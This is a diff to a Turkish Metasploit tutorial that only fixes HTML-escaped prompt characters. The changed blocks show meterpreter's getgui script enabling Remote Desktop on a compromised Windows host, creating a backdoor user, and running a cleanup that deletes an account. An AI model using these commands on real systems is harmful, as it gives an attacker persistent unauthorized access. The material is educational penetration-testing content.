@@ -42,7 +42,7 @@ Hedef bilgisayarda Meterpreter shell açtığınızı varsayıyoruz. Şimdi işe
 
 
 ```bash
-meterpreter **&gt;** run getgui -h
+meterpreter **>** run getgui -h
 Windows Remote Desktop Enabler Meterpreter Script
 Usage: getgui -u  -p 
 Or:    getgui -e
@@ -67,7 +67,7 @@ Genel olarak kullanımda `-u` kullanıcı adını, `-p` parolayı belirtmek içi
 
 
 ```bash
-meterpreter **&gt;** run getgui -u loneferret -p password
+meterpreter **>** run getgui -u loneferret -p password
 **[*********]** Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
 **[*********]** Carlos Perez carlos_perez@darkoperator.com
 **[*********]** Language detection started
@@ -78,7 +78,7 @@ meterpreter **&gt;** run getgui -u loneferret -p password
 **[*********]**   Adding User: loneferret to local group ''
 **[*********]** You can now login with the created user
 **[*********]** For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -108,8 +108,8 @@ Hedef sistemde ne kadar çok oynama yaparsanız, log kayıtlarına kaydedilme ih
 
 
 ```bash
-meterpreter **&gt;** run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
+meterpreter **>** run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
 **[*********]** Running Command List ...
 **[*********]**   Running command execute -H -f cmd.exe -a "/c net user hacker /delete"
 Process 288 created.
-meterpreter **&gt;**```
+meterpreter **>**```
